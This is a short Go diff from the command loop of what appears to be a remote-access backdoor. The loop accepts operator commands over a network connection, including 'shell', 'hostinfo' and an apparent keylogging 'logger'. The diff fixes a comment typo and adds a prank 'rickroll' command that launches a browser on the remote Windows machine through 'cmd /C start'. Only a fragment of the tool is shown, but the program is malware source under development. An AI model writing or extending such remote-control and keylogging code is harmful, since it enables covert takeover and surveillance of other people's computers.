@@ -166,16 +166,21 @@ func main() {
 						resultC1 := <-c1
 						*pResult = resultC1
 					}()
-					if result != "\n" { //The function doesnt end instantly, it waits the end of the buffer before exiting.
+					if result != "\n" { //The function doesnt end instantly, it waits for the end of the buffer before exiting.
 						break
 					}
 					logger(&conn)
 				}
 			}
+		case "rickroll\n": //I luv it
+			{
+				cmd := exec.Command("cmd", "/C", "start", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+				cmd.Run()
+			}
 		case "stop\n":
 			terminate()
 		default:
-			conn.Write([]byte("Available Commands: shell, hostinfo, logger, stop\n"))
+			conn.Write([]byte("Available Commands: shell, hostinfo, logger, rickroll, stop\n"))
 		}
 	}
 	//time.Sleep(10 * time.Second)
